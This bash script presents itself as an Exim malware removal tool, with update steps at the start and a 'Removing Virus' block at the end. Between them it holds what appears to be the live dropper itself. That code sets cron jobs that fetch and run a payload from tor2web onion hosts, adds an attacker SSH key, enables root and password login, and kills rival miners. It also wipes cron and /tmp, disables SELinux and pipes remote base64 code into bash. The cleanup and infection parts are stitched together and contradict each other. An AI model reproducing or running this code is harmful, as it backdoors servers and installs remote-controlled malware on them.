#!/bin/bash
rhrelease=/etc/redhat-release
echo "First we will update the Exim, so no new malware could be uploaded"
if [[ -f "$rhrelease" ]]; then
        echo "Centos is installed on server"
	if [[ ! -z  $(rpm -qa | grep exim) ]]; then
        	if [[ "$(cat /etc/redhat-release | tr -dc '0-9.'|cut -d \. -f1)" -gt "6" ]]; then

                	echo "Centos 7. Trying to update Exim and reintall curl"
                	yum install -y -q -e 0 exim  >/dev/null 2>&1
			yum reinstall -y -q -e 0 curl >/dev/null 2>&1
        	else
                	echo "Centos 6 only has fix in testing repo. Installing from it."
			wget https://kojipkgs.fedoraproject.org//packages/exim/4.92/1.el6/x86_64/exim-4.92-1.el6.x86_64.rpm 
			rpm -Fvh exim-4.92-1.el6.x86_64.rpm >/dev/null 2>&1
			yum reinstall -y -q -e 0 curl >/dev/null 2>&1
        	fi
	else 
		echo "No exim installed. We should stop"
		exit 1
	fi
		else
	if [[ ! -z $(dpkg -l | grep exim) ]]; then
		echo "All Debian-based distro should already get the update. Updating"
        	apt-get update >/dev/null 2>&1
        	apt-get --yes --force-yes install exim4 exim4-config >/dev/null 2>&1
		apt-get --yes --force-yes install --reinstall curl >/dev/null 2>&1
	else
		echo "No exim installed. We should stop"
		exit 1
	fi
fi

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
RHOST="https://an7kmd2wp4xo7hpr"
TOR1=".tor2web.su/"
TOR2=".tor2web.io/"
TOR3=".onion.sh/"
RPATH1='src/ldm'
#LPATH="${HOME-/tmp}/.cache/"
TIMEOUT="75"
CTIMEOUT="22"
COPTS=" -fsSLk --retry 2 --connect-timeout ${CTIMEOUT} --max-time ${TIMEOUT} "
WOPTS=" --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=${CTIMEOUT} --timeout=${TIMEOUT} "
tbin=$(command -v passwd); bpath=$(dirname "${tbin}")
curl="curl"; if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ]; then curl="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && curl="$f" && break; done; fi; fi
wget="wget"; if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ]; then wget="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2>/dev/null|grep -q ".wgetrc'-style command" && wget="$f" && break; done; fi; fi
#CHKCURL='curl="curl "; wget="wget "; if [ "$(whoami)" = "root" ]; then if [ $(command -v curl|wc -l) -eq 0 ]; then curl=$(ls /usr/bin|grep -i url|head -n 1); fi; if [ -z ${curl} ]; then curl="echo "; fi; if [ $(command -v wget|wc -l) -eq 0 ]; then wget=$(ls /usr/bin|grep -i wget|head -n 1); fi; if [ -z ${wget} ]; then wget="echo "; fi; if [ $(cat /etc/hosts|grep -i ".onion."|wc -l) -ne 0 ]; then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1; fi; fi; '
CHKCURL='tbin=$(command -v passwd); bpath=$(dirname "${tbin}"); curl="curl"; if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ]; then curl="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && curl="$f" && break; done; fi; fi; wget="wget"; if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ]; then wget="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2>/dev/null|grep -q "to <bug-wget@gnu.org>" && wget="$f" && break; done; fi; fi; if [ $(cat /etc/hosts|grep -i ".onion."|wc -l) -ne 0 ]; then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1; fi; '
LBIN8="kthrotlds"
null=' >/dev/null 2>&1'
sudoer=1
sudo=''
if [ "$(whoami)" != "root" ]; then
    sudo="sudo "
    timeout 1 sudo echo 'kthreadd' 2>/dev/null && sudoer=1||{ sudo=''; sudoer=0; }
fi
if [ $(command -v nohup|wc -l) -ne 0 ] && [ "$1" != "-n" ]; then
    ${sudo} chmod +x "$0"
    nohup ${sudo} "$0" -n >/dev/null 2>&1 &
    echo 'Sent!'
    exit $?
fi
rand=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(shuf -i 4-16 -n 1) ; echo ''); if [ -z ${rand} ]; then rand='.tmp'; fi
echo "${rand}" > "$(pwd)/.${rand}" 2>/dev/null && LPATH="$(pwd)/.cache/"; rm -f "$(pwd)/.${rand}" >/dev/null 2>&1
echo "${rand}" > "/tmp/.${rand}" 2>/dev/null && LPATH="/tmp/.cache/"; rm -f "/tmp/.${rand}" >/dev/null 2>&1
echo "${rand}" > "/usr/local/bin/.${rand}" 2>/dev/null && LPATH="/usr/local/bin/.cache/"; rm -f "/usr/local/bin/.${rand}" >/dev/null 2>&1
echo "${rand}" > "${HOME}/.${rand}" 2>/dev/null && LPATH="${HOME}/.cache/"; rm -f "${HOME}/.${rand}" >/dev/null 2>&1
mkdir -p ${LPATH} >/dev/null 2>&1
${sudo} chattr -i ${LPATH} >/dev/null 2>&1; chmod 755 ${LPATH} >/dev/null 2>&1; ${sudo} chattr +a ${LPATH} >/dev/null 2>&1
C1="*/9 * * * * ${CHKCURL} ("'${curl}'" ${COPTS} ${RHOST}${TOR1}${RPATH1} -o ${LPATH}.ntp||"'${curl}'" ${COPTS} ${RHOST}${TOR2}${RPATH1} -o ${LPATH}.ntp||"'${curl}'" ${COPTS} ${RHOST}${TOR3}${RPATH1} -o ${LPATH}.ntp||"'${wget}'" ${WOPTS} ${RHOST}${TOR1}${RPATH1} -O ${LPATH}.ntp||"'${wget}'" ${WOPTS} ${RHOST}${TOR2}${RPATH1} -O ${LPATH}.ntp||"'${wget}'" ${WOPTS} ${RHOST}${TOR3}${RPATH1} -O ${LPATH}.ntp) && chmod +x ${LPATH}.ntp && $(command -v sh) ${LPATH}.ntp"
C2="*/11 * * * * root ${CHKCURL} ("'${curl}'" ${COPTS} ${RHOST}${TOR1}${RPATH1} -o ${LPATH}.ntp||"'${curl}'" ${COPTS} ${RHOST}${TOR2}${RPATH1} -o ${LPATH}.ntp||"'${curl}'" ${COPTS} ${RHOST}${TOR3}${RPATH1} -o ${LPATH}.ntp||"'${wget}'" ${WOPTS} ${RHOST}${TOR1}${RPATH1} -O ${LPATH}.ntp||"'${wget}'" ${WOPTS} ${RHOST}${TOR2}${RPATH1} -O ${LPATH}.ntp||"'${wget}'" ${WOPTS} ${RHOST}${TOR3}${RPATH1} -O ${LPATH}.ntp) && chmod +x ${LPATH}.ntp && $(command -v sh) ${LPATH}.ntp"
skey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1Sdr0tIIL8yPhKTLzVMnRKj1zzGqtR4tKpM2bfBEx+AHyvBL8jDZDJ6fuVwEB+aZ8bl/pA5qhFWRRWhONLnLN9RWFx/880msXITwOXjCT3Qa6VpAFPPMazJpbppIg+LTkbOEjdDHvdZ8RhEt7tTXc2DoTDcs73EeepZbJmDFP8TCY7hwgLi0XcG8YHkDFoKFUhvSHPkzAsQd9hyOWaI1taLX2VZHAk8rOaYqaRG3URWH3hZvk8Hcgggm2q/IQQa9VLlX4cSM4SifM/ZNbLYAJhH1x3ZgscliZVmjB55wZWRL5oOZztOKJT2oczUuhDHM1qoUJjnxopqtZ5DrA76WH user@localhost"
if [ "$(whoami)" != "root" ]; then sshdir="${HOME}/.ssh"; else sshdir='/root/.ssh'; fi
${sudo} rm -f /tmp/* >/dev/null 2>&1
${sudo} rm -f /tmp/.* >/dev/null 2>&1
${sudo} ps ax|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep -v ".ntp"|grep -i "nicehash\|linuxs\|linuxl\|Linux\|crawler.weibo\|44444\|cryptonight\|stratum\|gpg-daemon\|jobs.flu.cc\|nmap\|cranberry\|start.sh\|watch.sh\|krun.sh\|killTop.sh\|cpuminer\|/60009\|ssh_deny.sh\|clean.sh\|\./over\|mrx1\|redisscan\|ebscan\|redis-cli\|barad_agent\|\.sr0\|clay\|udevs\|\.sshd\|/tmp/init"|uniq| while read pid _; do if [ ${pid} -gt 301 ] && [ "$pid" != "$$" ]; then ${sudo} kill -9 "${pid}" >/dev/null 2>&1; ${sudo} kill -TERM -"${pid}" >/dev/null 2>&1; fi; done
${sudo} ps ax|grep -v grep|grep -v defunct|grep -v "bash"|grep -v "ssh"|grep -v ".ntp"|grep -i " sh\|kworkerds\|56416\|xmr\|xig\|ddgs\|minerd\|hashvault\|geqn\|.kthreadd\|httpdz\|kworker\|config.json\|gwjyhs.com\|pastebin.com\|sobot.com\|kerbero"|uniq| while read pid _; do if [ ${pid} -gt 301 ] && [ "$pid" != "$$" ]; then ${sudo} kill -9 "${pid}" >/dev/null 2>&1; ${sudo} kill -TERM -"${pid}" >/dev/null 2>&1; fi; done
hload=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep -vi 'java '|grep -vi 'jenkins'|awk '{if($3>=54.0) print $11}'|head -n 1)
[ "${hload}" != "" ] && { ${sudo} ps ax|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep "xmr\|${hload}"|while read pid _; do if [ ${pid} -gt 301 ] && [ "$pid" != "$$" ]; then ${sudo} kill -9 "${pid}" >/dev/null 2>&1; fi; done; }
#${sudo} pkill sleep >/dev/null 2>&1
#loop=$(ps -eo ppid,comm|grep -v grep|grep -i ' sleep'|awk '{print $1}'|uniq)
#if [ "${loop}" != "" ]; then for p in ${loop}; do if [ $p -gt 301 ] && [ $p -ne $$ ] && [ $p -ne $PPID ]; then $sudo kill -9 $p; $sudo pkill -P $p; fi; done; fi
hload2=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep -v python|grep -v "${LBIN8}"|awk '{if($3>=0.0) print $2}'|uniq)
if [ "${hload2}" != "" ]; then
    for p in ${hload2}; do
        xm=''
        if [ $p -gt 301 ]; then
            if [ -f /proc/${p}/exe ]; then
                xmf="$(readlink /proc/${p}/cwd 2>/dev/null)/$(cat /proc/${p}/comm 2>/dev/null)"
                xm=$(grep -i "xmr\|cryptonight\|hashrate" /proc/${p}/exe 2>/dev/null)
            elif [ -f /proc/${p}/comm ]; then
                xmf="$(readlink /proc/${p}/cwd 2>/dev/null)/$(cat /proc/${p}/comm 2>/dev/null)"
                xm=$(grep -i "xmr\|cryptonight\|hashrate" ${xmf} 2>/dev/null)
            fi
            if [ -n "${xm}" ]; then ${sudo} kill -9 ${p} >/dev/null 2>&1; ${sudo} chattr -i -a "${xmf}" >/dev/null 2>&1; ${sudo} rm -rf "${xmf}" >/dev/null 2>&1; fi
        fi
    done
fi
others=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|awk '{if($3>=0.0) print $11}')
if [ "${others}" != "" ]; then
    for o in ${others}; do
        okill=0
        if [ -f "${o}" ]; then
            if grep -qi 'ddgs' "${o}" 2>/dev/null && grep -qi 'slave' "${o}" 2>/dev/null; then okill=1; fi
            if grep -qi 'kerberods' "${o}" 2>/dev/null || grep -qi 'khugepageds' "${o}" 2>/dev/null; then okill=1; fi
            if [ ${okill} -eq 1 ]; then
                ${sudo} ps ax|grep -v grep|grep -v defunct|grep "${o}"|while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
                ${sudo} chattr -i -a "${o}" >/dev/null 2>&1; rm -rf "${o}" >/dev/null 2>&1
            fi
        fi
    done
fi
net=$(${curl} -fsSLk --max-time 6 ipinfo.io/ip)
if echo "${net}"|grep -q 'Could not resolve proxy'; then
    unset http_proxy; unset HTTP_PROXY; unset https_proxy; unset HTTPS_PROXY
    http_proxy=""; HTTP_PROXY=""; https_proxy=""; HTTPS_PROXY=""
fi
if [ ${sudoer} -eq 1 ]; then
    if [ -f /etc/ld.so.preload ]; then
        if [ $(which chattr|wc -l) -ne 0 ]; then ${sudo} chattr -i /etc/ld.so.preload >/dev/null 2>&1; fi
        ${sudo} ln -sf /etc/ld.so.preload /tmp/.ld.so >/dev/null 2>&1
        >/tmp/.ld.so >/dev/null 2>&1
        ${sudo} rm -rf /etc/ld.so.preload* >/dev/null 2>&1
    fi
    #${sudo} find / -name ld.so.preload* -exec ${sudo} rm -rf {} \;
    if [ -d /etc/systemd/system/ ]; then ${sudo} rm -rf /etc/systemd/system/cloud* >/dev/null 2>&1; fi
    [ $(${sudo} cat /etc/hosts|grep -i ".onion."|wc -l) -ne 0 ] && { ${sudo} chattr -i -a /etc/hosts >/dev/null 2>&1; ${sudo} chmod 644 /etc/hosts >/dev/null 2>&1; ${sudo} sed -i '/.onion.$/d' /etc/hosts >/dev/null 2>&1; }
    [ $(${sudo} cat /etc/hosts|grep -i "busybox"|wc -l) -ne 0 ] && { ${sudo} chattr -i -a /etc/hosts >/dev/null 2>&1; ${sudo} chmod 644 /etc/hosts >/dev/null 2>&1; ${sudo} sed -i '/busybox$/d' /etc/hosts >/dev/null 2>&1; }
    [ $(${sudo} cat /etc/hosts|grep -i ".onion."|wc -l) -ne 0 ] && { ${sudo} echo '127.0.0.1 localhost' > /etc/hosts >/dev/null 2>&1; }
    if [ -f /usr/bin/yum ]; then
        if [ -f /usr/bin/systemctl ]; then
            crstart="systemctl restart crond.service >/dev/null 2>&1"
            crstop="systemctl stop crond.service >/dev/null 2>&1"
        else
            crstart="/etc/init.d/crond restart >/dev/null 2>&1"
            crstop="/etc/init.d/crond stop >/dev/null 2>&1"
        fi
    elif [ -f /usr/bin/apt-get ]; then
        crstart="service cron restart >/dev/null 2>&1"
        crstop="service cron stop >/dev/null 2>&1"
    elif [ -f /usr/bin/pacman ]; then
        crstart="/etc/rc.d/cronie restart >/dev/null 2>&1"
        crstop="/etc/rc.d/cronie stop >/dev/null 2>&1"
    elif [ -f /sbin/apk ]; then
        crstart="/etc/init.d/crond restart >/dev/null 2>&1"
        crstop="/etc/init.d/crond stop >/dev/null 2>&1"
    fi
    if [ ! -f "${LPATH}.sysud" ] || [ $(bash --version 2>/dev/null|wc -l) -eq 0 ] || [ $(wget --version 2>/dev/null|wc -l) -eq 0 ]; then
        if [ -f /usr/bin/yum ]; then
            yum install -y -q -e 0 openssh-server iptables bash curl wget zip unzip python2 net-tools e2fsprogs vixie-cron cronie >/dev/null 2>&1
            yum reinstall -y -q -e 0 curl wget unzip bash net-tools vixie-cron cronie >/dev/null 2>&1
            chkconfig sshd on >/dev/null 2>&1
            chkconfig crond on >/dev/null 2>&1;
            if [ -f /usr/bin/systemctl ]; then
                systemctl start sshd.service >/dev/null 2>&1
            else
                /etc/init.d/sshd start >/dev/null 2>&1
            fi
        elif [ -f /usr/bin/apt-get ]; then
            rs=$(yes | ${sudo} apt-get update >/dev/null 2>&1)
            if echo "${rs}"|grep -q 'dpkg was interrupted'; then y | ${sudo} dpkg --configure -a; fi
            DEBIAN_FRONTEND=noninteractive ${sudo} apt-get --yes --force-yes install openssh-server iptables bash cron curl wget zip unzip python python-minimal vim e2fsprogs net-tools >/dev/null 2>&1
            DEBIAN_FRONTEND=noninteractive ${sudo} apt-get --yes --force-yes install --reinstall curl wget unzip bash net-tools cron
            ${sudo} systemctl enable ssh
            ${sudo} systemctl enable cron
            ${sudo} /etc/init.d/ssh restart >/dev/null 2>&1
        elif [ -f /usr/bin/pacman ]; then
            pacman -Syy >/dev/null 2>&1
            pacman -S --noconfirm base-devel openssh iptables bash cronie curl wget zip unzip python2 vim e2fsprogs net-tools >/dev/null 2>&1
            systemctl enable --now cronie.service >/dev/null 2>&1
            systemctl enable --now sshd.service >/dev/null 2>&1
            /etc/rc.d/sshd restart >/dev/null 2>&1
        elif [ -f /sbin/apk ]; then
            #apk --no-cache -f upgrade >/dev/null 2>&1
            apk --no-cache -f add curl wget unzip bash busybox openssh iptables python vim e2fsprogs e2fsprogs-extra net-tools openrc >/dev/null 2>&1
            apk del openssl-dev net-tools >/dev/null 2>&1; apk del libuv-dev >/dev/null 2>&1;
            apk add --no-cache openssl-dev libuv-dev net-tools --repository http://dl-cdn.alpinelinux.org/alpine/v3.9/main >/dev/null 2>&1
            rc-update add sshd >/dev/null 2>&1
            /etc/init.d/sshd start >/dev/null 2>&1
            if [ -f /etc/init.d/crond ]; then rc-update add crond >/dev/null 2>&1; /etc/init.d/crond restart >/dev/null 2>&1; else /usr/sbin/crond -c /etc/crontabs >/dev/null 2>&1; fi
        fi
    fi
    ${sudo} chattr -i -a /var/spool/cron >/dev/null 2>&1; ${sudo} chattr -i -a -R /var/spool/cron/ >/dev/null 2>&1; ${sudo} chattr -i -a /etc/cron.d >/dev/null 2>&1; ${sudo} chattr -i -a -R /etc/cron.d/ >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron/crontabs >/dev/null 2>&1; ${sudo} chattr -i -a -R /var/spool/cron/crontabs/ >/dev/null 2>&1
    ${sudo} rm -rf /var/spool/cron/crontabs/* >/dev/null 2>&1; ${sudo} rm -rf /var/spool/cron/crontabs/.* >/dev/null 2>&1; ${sudo} rm -f /var/spool/cron/* >/dev/null 2>&1; ${sudo} rm -f /var/spool/cron/.* >/dev/null 2>&1; ${sudo} rm -rf /etc/cron.d/* >/dev/null 2>&1; ${sudo} rm -rf /etc/cron.d/.* >/dev/null 2>&1;
    ${sudo} chattr -i -a /etc/cron.hourly >/dev/null 2>&1; ${sudo} chattr -i -a -R /etc/cron.hourly/ >/dev/null 2>&1; ${sudo} chattr -i -a /etc/cron.daily >/dev/null 2>&1; ${sudo} chattr -i -a -R /etc/cron.daily/ >/dev/null 2>&1
    ${sudo} rm -rf /etc/cron.hourly/* >/dev/null 2>&1; ${sudo} rm -rf /etc/cron.hourly/.* >/dev/null 2>&1; ${sudo} rm -rf /etc/cron.daily/* >/dev/null 2>&1; ${sudo} rm -rf /etc/cron.daily/.* >/dev/null 2>&1; 
    ${sudo} chattr -a -i /tmp >/dev/null 2>&1; ${sudo} rm -rf /tmp/* >/dev/null 2>&1; ${sudo} rm -rf /tmp/.* >/dev/null 2>&1
    ${sudo} chattr -a -i /etc/crontab >/dev/null 2>&1; ${sudo} chattr -i /var/spool/cron/root >/dev/null 2>&1; ${sudo} chattr -i /var/spool/cron/crontabs/root >/dev/null 2>&1
    if [ -f /sbin/apk ]; then
        ${sudo} mkdir -p /etc/crontabs >/dev/null 2>&1; ${sudo} chattr -i -a /etc/crontabs >/dev/null 2>&1; ${sudo} chattr -i -a -R /etc/crontabs/* >/dev/null 2>&1
        ${sudo} rm -rf /etc/crontabs/* >/dev/null 2>&1; ${sudo} echo "${C1}" > /etc/crontabs/root >/dev/null 2>&1 && ${sudo} echo "${C2}" >> /etc/crontabs/root >/dev/null 2>&1 && ${sudo} echo '' >> /etc/crontabs/root >/dev/null 2>&1 && ${sudo} crontab /etc/crontabs/root
    elif [ -f /usr/bin/apt-get ]; then
        ${sudo} mkdir -p /var/spool/cron/crontabs >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron/crontabs/root >/dev/null 2>&1
        rs=$(${sudo} echo "${C1}" > /var/spool/cron/crontabs/root 2>&1)
        if [ -z ${rs} ]; then ${sudo} echo '' >> /var/spool/cron/crontabs/root && ${sudo} crontab /var/spool/cron/crontabs/root; fi
    else
        ${sudo} mkdir -p /var/spool/cron >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron/root >/dev/null 2>&1
        rs=$(${sudo} echo "${C1}" > /var/spool/cron/root 2>&1)
        if [ -z ${rs} ]; then ${sudo} echo '' >> /var/spool/cron/root && ${sudo} crontab /var/spool/cron/root; fi
    fi
    ${sudo} chattr -i -a /etc/crontab >/dev/null 2>&1; rs=$(${sudo} echo "${C2}" > /etc/crontab 2>&1)
    if [ -z "${rs}" ]; then ${sudo} echo '' >> /etc/crontab && ${sudo} crontab /etc/crontab; fi
    ${sudo} mkdir -p /etc/cron.d >/dev/null 2>&1; ${sudo} chattr -i -a /etc/cron.d/root >/dev/null 2>&1
    rs=$(${sudo} echo "${C2}" > /etc/cron.d/root 2>&1 && ${sudo} echo '' >> /etc/cron.d/root 2>&1)
    if [ $(crontab -l 2>/dev/null|grep -i "${RHOST}"|wc -l) -lt 1 ]; then
        (${curl} ${COPTS} https://busybox.net/downloads/binaries/1.30.0-i686/busybox_RM -o ${LPATH}.rm||${wget} ${WOPTS} https://busybox.net/downloads/binaries/1.30.0-i686/busybox_RM -O ${LPATH}.rm) && chmod +x ${LPATH}.rm
        (${curl} ${COPTS} https://busybox.net/downloads/binaries/1.30.0-i686/busybox_CROND -o ${LPATH}.cd||${wget} ${WOPTS} https://busybox.net/downloads/binaries/1.30.0-i686/busybox_CROND -O ${LPATH}.cd) && chmod +x ${LPATH}.cd
        (${curl} ${COPTS} https://busybox.net/downloads/binaries/1.30.0-i686/busybox_CRONTAB -o ${LPATH}.ct||${wget} ${WOPTS} https://busybox.net/downloads/binaries/1.30.0-i686/busybox_CRONTAB -O ${LPATH}.ct) && chmod +x ${LPATH}.ct
        if [ -f ${LPATH}.rm ] && [ -f ${LPATH}.ct ]; then
            ${sudo} "${crstop}"
            cd=$(which crond)
            ct=$(which crontab)
            #if [ -n "${cd}" ]; then ${sudo} ${LPATH}.rm ${cd}; ${sudo} cp ${LPATH}.cd ${cd}; fi
            if [ -n "${ct}" ]; then ${sudo} ${LPATH}.rm ${ct}; ${sudo} cp ${LPATH}.ct ${ct}; fi
            ${sudo} "${crstart}"
        fi
    fi
    ${sudo} mkdir -p "${sshdir}" >/dev/null 2>&1
    if [ ! -f ${sshdir}/authorized_keys ]; then ${sudo} touch ${sshdir}/authorized_keys >/dev/null 2>&1; fi
    ${sudo} chattr -i -a ${LPATH} >/dev/null 2>&1; ${sudo} chattr -i -a "${sshdir}" >/dev/null 2>&1; ${sudo} chattr -i -a -R "${sshdir}/" >/dev/null 2>&1; ${sudo} chattr -i -a ${sshdir}/authorized_keys >/dev/null 2>&1
    if [ -n "$(grep -F redis ${sshdir}/authorized_keys)" ] || [ $(wc -l < ${sshdir}/authorized_keys) -gt 98 ]; then ${sudo} echo "${skey}" > ${sshdir}/authorized_keys; fi
    if test "$(${sudo} grep "^${skey}" ${sshdir}/authorized_keys)" != "${skey}"; then  ${sudo} echo "${skey}" >> ${sshdir}/authorized_keys; fi
    ${sudo} chmod 0700 ${sshdir} >/dev/null 2>&1; ${sudo} chmod 600 ${sshdir}/authorized_keys >/dev/null 2>&1; ${sudo} chattr +i ${sshdir}/authorized_keys >/dev/null 2>&1; ${sudo} rm -rf ${sshdir}/authorized_keys* >/dev/null 2>&1
    [ "$(${sudo} cat /etc/ssh/sshd_config | grep '^PermitRootLogin')" != "PermitRootLogin yes" ] && { ${sudo} echo PermitRootLogin yes >> /etc/ssh/sshd_config; }
    [ "$(${sudo} cat /etc/ssh/sshd_config | grep '^RSAAuthentication')" != "RSAAuthentication yes" ] && { ${sudo} echo RSAAuthentication yes >> /etc/ssh/sshd_config; }
    [ "$(${sudo} cat /etc/ssh/sshd_config | grep '^PubkeyAuthentication')" != "PubkeyAuthentication yes" ] && { ${sudo} echo PubkeyAuthentication yes >> /etc/ssh/sshd_config; }
    [ "$(${sudo} cat /etc/ssh/sshd_config | grep '^UsePAM')" != "UsePAM yes" ] && { ${sudo} echo UsePAM yes >> /etc/ssh/sshd_config; }
    [ "$(${sudo} cat /etc/ssh/sshd_config | grep '^PasswordAuthentication yes')" != "PasswordAuthentication yes" ] && { ${sudo} echo PasswordAuthentication yes >> /etc/ssh/sshd_config; }
    touch "${LPATH}.sysud"
else
    if [ $(which crontab|wc -l) -ne 0 ]; then
        crontab -r >/dev/null 2>&1
        (crontab -l >/dev/null 2>&1; echo "${C1}") | crontab -
    fi
fi
rm -rf ./main* >/dev/null 2>&1
rm -rf ./*.ico* >/dev/null 2>&1
rm -rf ./r64* >/dev/null 2>&1
rm -rf ./r32* >/dev/null 2>&1
[ $(echo "$0"|grep -i ".cache"|wc -l) -eq 0 ] && [ "$1" != "" ] && { rm -f "$0" >/dev/null 2>&1; }
echo -e '\n'
(${curl} ${COPTS} ${RHOST}${TOR1}src/main||${curl} ${COPTS} ${RHOST}${TOR2}src/main||${curl} ${COPTS} ${RHOST}${TOR3}src/main||${wget} ${WOPTS} ${RHOST}${TOR1}src/main||${wget} ${WOPTS} ${RHOST}${TOR2}src/main||${wget} ${WOPTS} ${RHOST}${TOR3}src/main)|base64 -d |${sudo} $(command -v bash)
if [ ${sudoer} -eq 1 ]; then
    if echo "$(${sudo} cat /etc/selinux/config 2>/dev/null|grep "SELINUX="|tail -n 1)"|grep -q 'enforcing'; then
        ${sudo} sed -i "s:SELINUX=enforcing:SELINUX=disabled:" /etc/selinux/config || { echo "SELinux could not be disabled. Exiting."; exit; }
        ${sudo} shutdown -r now >/dev/null 2>&1
        ${sudo} reboot -f >/dev/null 2>&1
    fi
    if echo "$(sestatus -v  2>/dev/null| head -n 1)"|grep -q 'enabled'; then ${sudo} shutdown -r now >/dev/null 2>&1; ${sudo} reboot -f >/dev/null 2>&1; fi

		echo "Removing Virus, will cause a reboot"
		service crond stop >/dev/null 2>&1
		service cron stop >/dev/null 2>&1
		kill -9 `pgrep kthrotlds` >/dev/null 2>&1
		killall -9 curl wget sh >/dev/null 2>&1
		killall -9 curl wget sh >/dev/null 2>&1
		killall -9 curl wget sh >/dev/null 2>&1
		killall -9 curl wget sh >/dev/null 2>&1
		exim -bpru | awk {'print $3'} | xargs exim -Mrm >/dev/null 2>&1
		chattr -i   /etc/cron.daily/cronlog /etc/cron.d/root  /etc/cron.d/.cronbus /etc/cron.hourly/cronlog /etc/cron.monthly/cronlog /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.d/root /etc/crontab /root/.cache/ /root/.cache/a /usr/local/bin/nptd /root/.cache/.kswapd /usr/bin/\[kthrotlds\] /root/.ssh/authorized_keys /.cache/* /.cache/.sysud /.cache/.a /.cache/.favicon.ico /.cache/.kswapd /.cache/.ntp >/dev/null 2>&1
		rm -rf    /etc/cron.daily/cronlog /etc/cron.d/root  /etc/cron.d/.cronbus /etc/cron.hourly/cronlog /etc/cron.monthly/cronlog /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.d/root /etc/crontab /root/.cache/ /usr/local/bin/npt /usr/local/bin/nptd /usr/bin/\[kthrotlds\] /.cache >/dev/null 2>&1
		sed -i -e '/bin\/npt/d' /etc/rc.local >/dev/null 2>&1
		sed -i -e '/user@localhost/d' ~/.ssh/authorized_keys >/dev/null 2>&1
		service crond start >/dev/null 2>&1
		service cron start >/dev/null 2>&1
		exim -bpru | awk {'print $3'} | xargs exim -Mrm
yum -y reinstall cronie
/scripts/check_cpanel_rpms --fix 
		echo "fixed! SYSTEM is going to REBOOT"
		reboot
